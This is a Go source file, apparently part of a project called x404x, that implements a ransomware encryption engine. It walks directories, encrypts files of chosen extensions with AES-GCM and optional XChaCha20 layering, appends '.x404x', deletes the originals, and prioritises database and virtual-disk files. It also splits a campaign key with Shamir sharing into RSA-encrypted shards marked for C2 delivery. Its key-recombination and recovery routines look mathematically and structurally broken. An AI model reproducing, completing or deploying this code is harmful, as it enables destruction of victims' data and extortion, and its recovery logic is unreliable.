package ransomware

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"sync"

	ccrypto "github.com/ruby570bocadito/x404x/core/crypto"
	"golang.org/x/crypto/chacha20poly1305"
)

type HydraEngine struct {
	config        *RansomwareConfig
	manifest      *EncryptionManifest
	rsaKeys       []*rsa.PrivateKey
	rsaPublic     []*rsa.PublicKey
	campaignKey   [32]byte
	mu            sync.Mutex
	encryptedCount int
}

func NewHydraEngine(cfg *RansomwareConfig) (*HydraEngine, error) {
	he := &HydraEngine{
		config: cfg,
	}

	kp, err := ccrypto.GenerateKeyPair()
	if err != nil {
		return nil, fmt.Errorf("campaign key: %w", err)
	}
	he.campaignKey = kp.PrivateKey

	for i := 0; i < cfg.ShamirParts; i++ {
		key, err := rsa.GenerateKey(rand.Reader, 4096)
		if err != nil {
			return nil, fmt.Errorf("rsa key %d: %w", i, err)
		}
		he.rsaKeys = append(he.rsaKeys, key)
		he.rsaPublic = append(he.rsaPublic, &key.PublicKey)
	}

	he.manifest = &EncryptionManifest{
		Shards:      make([]EncryptionShard, cfg.ShamirParts),
		ShamirParts: cfg.ShamirParts,
		Threshold:   cfg.ShamirThreshold,
		FileKeys:    make(map[string]FileKey),
	}

	return he, nil
}

func (he *HydraEngine) EncryptFile(path string, doubleEncrypt bool) error {
	he.mu.Lock()
	defer he.mu.Unlock()

	if he.config.Simulation {
		return nil
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("read %s: %w", path, err)
	}

	fileAESKey := make([]byte, 32)
	fileAESNonce := make([]byte, 12)
	io.ReadFull(rand.Reader, fileAESKey)
	io.ReadFull(rand.Reader, fileAESNonce)

	block, err := aes.NewCipher(fileAESKey)
	if err != nil {
		return fmt.Errorf("aes cipher: %w", err)
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("aes gcm: %w", err)
	}

	layer1 := aesgcm.Seal(nil, fileAESNonce, data, nil)

	var finalData []byte

	if doubleEncrypt {
		chachaKey := make([]byte, chacha20poly1305.KeySize)
		chachaNonce := make([]byte, chacha20poly1305.NonceSizeX)
		io.ReadFull(rand.Reader, chachaKey)
		io.ReadFull(rand.Reader, chachaNonce)

		aead, err := chacha20poly1305.NewX(chachaKey)
		if err != nil {
			return fmt.Errorf("chacha cipher: %w", err)
		}

		layer2 := aead.Seal(nil, chachaNonce, layer1, nil)

		var header [1 + 32 + 24 + 12]byte
		header[0] = 2
		copy(header[1:33], chachaKey)
		copy(header[33:57], chachaNonce)
		copy(header[57:69], fileAESNonce)

		finalData = append(header[:], layer2...)

		fk := FileKey{
			ChaChaKey:  chachaKey,
			ChaChaNonce: chachaNonce,
			AESKey:     fileAESKey,
			AESNonce:   fileAESNonce,
			DoubleEnc:  true,
		}

		encKey, err := he.rsaEncrypt(shamirSerialize(fk))
		if err == nil {
			rel, _ := filepath.Rel("/", path)
			he.manifest.FileKeys[rel] = fk
			_ = encKey
		}
	} else {
		var header [1 + 32 + 12]byte
		header[0] = 1
		copy(header[1:33], fileAESKey)
		copy(header[33:45], fileAESNonce)

		finalData = append(header[:], layer1...)

		fk := FileKey{
			AESKey:   fileAESKey,
			AESNonce: fileAESNonce,
			DoubleEnc: false,
		}
		rel, _ := filepath.Rel("/", path)
		he.manifest.FileKeys[rel] = fk
	}

	if err := os.WriteFile(path+".x404x", finalData, 0644); err != nil {
		return fmt.Errorf("write encrypted: %w", err)
	}

	os.Remove(path)
	he.encryptedCount++

	return nil
}

func (he *HydraEngine) EncryptDirectory(root string, extensions []string, doubleCritical bool) (int, error) {
	var wg sync.WaitGroup
	sem := make(chan struct{}, 8)
	errChan := make(chan error, 100)
	count := 0

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		ext := filepath.Ext(path)
		shouldDouble := doubleCritical && isCriticalExtension(ext)

		for _, target := range extensions {
			if ext == target {
				wg.Add(1)
				sem <- struct{}{}
				go func(p string, dbl bool) {
					defer wg.Done()
					defer func() { <-sem }()
					if err := he.EncryptFile(p, dbl); err != nil {
						errChan <- err
					}
				}(path, shouldDouble)
				count++
				break
			}
		}
		return nil
	})

	wg.Wait()
	close(errChan)

	var errs []error
	for e := range errChan {
		errs = append(errs, e)
	}

	return count, nil
}

func (he *HydraEngine) SplitMasterKey() error {
	if he.config.ShamirParts < 2 {
		return nil
	}

	secret := he.campaignKey[:]

	shards, err := shamirSplit(secret, he.config.ShamirParts, he.config.ShamirThreshold)
	if err != nil {
		return fmt.Errorf("shamir split: %w", err)
	}

	for i, shard := range shards {
		pubKey := he.rsaPublic[i]
		encrypted, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, shard, nil)
		if err != nil {
			return fmt.Errorf("encrypt shard %d: %w", i, err)
		}
		he.manifest.Shards[i] = EncryptionShard{
			Index:    i,
			KeyBytes: encrypted,
			C2Index:  i,
			Sent:     false,
		}
	}

	return nil
}

func (he *HydraEngine) GetShardPrivateKey(index int) []byte {
	if index < 0 || index >= len(he.rsaKeys) {
		return nil
	}
	privBytes, _ := x509.MarshalPKCS8PrivateKey(he.rsaKeys[index])
	return pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: privBytes})
}

func (he *HydraEngine) rsaEncrypt(data []byte) ([]byte, error) {
	for _, pub := range he.rsaPublic {
		return rsa.EncryptOAEP(sha256.New(), rand.Reader, pub, data, nil)
	}
	return nil, errors.New("no rsa keys")
}

func (he *HydraEngine) Stats() int {
	return he.encryptedCount
}

func shamirSplit(secret []byte, parts, threshold int) ([][]byte, error) {
	if threshold < 2 || threshold > parts || len(secret) == 0 {
		return nil, errors.New("invalid shamir params")
	}

	n := len(secret)
	coeffs := make([][]byte, threshold)
	for i := 0; i < threshold; i++ {
		coeffs[i] = make([]byte, n)
		if i == 0 {
			copy(coeffs[i], secret)
		} else {
			io.ReadFull(rand.Reader, coeffs[i])
		}
	}

	shards := make([][]byte, parts)
	for i := 0; i < parts; i++ {
		x := big.NewInt(int64(i + 1))
		shard := make([]byte, n)
		copy(shard, coeffs[0])

		for j := 1; j < threshold; j++ {
			pow := new(big.Int).Exp(x, big.NewInt(int64(j)), nil)
			term := new(big.Int).SetBytes(coeffs[j])
			term.Mul(term, pow)
			coeffSum := new(big.Int).SetBytes(shard)
			coeffSum.Add(coeffSum, term)
			shard = coeffSum.Bytes()
			if len(shard) < n {
				padded := make([]byte, n)
				copy(padded[n-len(shard):], shard)
				shard = padded
			}
		}
		shard = append([]byte{byte(i + 1)}, shard...)
		shards[i] = shard
	}

	return shards, nil
}

func shamirSerialize(fk FileKey) []byte {
	var data []byte
	if fk.DoubleEnc {
		data = append(data, 2)
		data = append(data, fk.ChaChaKey...)
		data = append(data, fk.ChaChaNonce...)
		data = append(data, fk.AESKey...)
		data = append(data, fk.AESNonce...)
	} else {
		data = append(data, 1)
		data = append(data, fk.AESKey...)
		data = append(data, fk.AESNonce...)
	}
	return data
}

func isCriticalExtension(ext string) bool {
	critical := []string{".mdf", ".ldf", ".vhd", ".vhdx", ".vmdk", ".pst", ".ost", ".sql", ".dbf"}
	for _, c := range critical {
		if ext == c {
			return true
		}
	}
	return false
}

func encodeEncryptedHeader(version byte, key, nonce []byte) ([]byte, error) {
	var hdr []byte
	switch version {
	case 1:
		hdr = make([]byte, 1+32+12)
		hdr[0] = 1
		copy(hdr[1:33], key)
		copy(hdr[33:45], nonce)
	case 2:
		hdr = make([]byte, 1+32+24+32+12)
		hdr[0] = 2
		offset := 1
		copy(hdr[offset:], key[:32])
		offset += 32
		copy(hdr[offset:], nonce[:24])
		offset += 24
		copy(hdr[offset:], key[:32])
		offset += 32
		copy(hdr[offset:], nonce[:12])
	default:
		return nil, errors.New("unknown version")
	}
	return hdr, nil
}

func ShamirCombine(shards [][]byte, threshold int) ([]byte, error) {
	if len(shards) < threshold {
		return nil, errors.New("not enough shards")
	}

	n := len(shards[0]) - 1
	secret := make([]byte, n)

	for i := 0; i < n; i++ {
		var result big.Int
		for j := 0; j < threshold; j++ {
			xj := big.NewInt(int64(shards[j][0]))
			yj := big.NewInt(int64(shards[j][i+1]))

			var num, den big.Int
			num.SetInt64(1)
			den.SetInt64(1)

			for m := 0; m < threshold; m++ {
				if m == j {
					continue
				}
				xm := big.NewInt(int64(shards[m][0]))
				var tmp big.Int
				tmp.Neg(xm)
				num.Mul(&num, &tmp)
				tmp.Sub(xj, xm)
				den.Mul(&den, &tmp)
			}

			den.ModInverse(&den, big.NewInt(0).Lsh(big.NewInt(1), uint(n*8)))
			if den == nil {
				continue
			}
			var term big.Int
			term.Mul(&num, &den)
			term.Mul(&term, yj)
			result.Add(&result, &term)
		}
		secret[i] = byte(result.Int64() & 0xFF)
	}

	return secret, nil
}

func RecoverFile(encryptedPath string, masterKey []byte) error {
	data, err := os.ReadFile(encryptedPath)
	if err != nil {
		return err
	}

	version := data[0]
	var aesKey, aesNonce, chachaKey, chachaNonce []byte

	switch version {
	case 1:
		aesKey = data[1:33]
		aesNonce = data[33:45]
		ciphertext := data[45:]

		block, _ := aes.NewCipher(aesKey)
		gcm, _ := cipher.NewGCM(block)
		plaintext, err := gcm.Open(nil, aesNonce, ciphertext, nil)
		if err != nil {
			return err
		}
		outPath := encryptedPath[:len(encryptedPath)-len(".x404x")]
		return os.WriteFile(outPath, plaintext, 0644)

	case 2:
		chachaKey = data[1:33]
		chachaNonce = data[33:57]
		innerNonce := data[57:69]
		ciphertext := data[69:]

		aead, _ := chacha20poly1305.NewX(chachaKey)
		layer1, err := aead.Open(nil, chachaNonce, ciphertext, nil)
		if err != nil {
			return err
		}

		fileNameLen := binary.BigEndian.Uint16(layer1[:2])
		_ = string(layer1[2 : 2+fileNameLen])
		innerCipher := layer1[2+fileNameLen:]

		block, _ := aes.NewCipher(masterKey)
		gcm, _ := cipher.NewGCM(block)
		plaintext, err := gcm.Open(nil, innerNonce, innerCipher, nil)
		if err != nil {
			return fmt.Errorf("aes decrypt: %w", err)
		}

		outPath := encryptedPath[:len(encryptedPath)-len(".x404x")]
		return os.WriteFile(outPath, plaintext, 0644)

	default:
		return errors.New("unknown encryption version")
	}
}
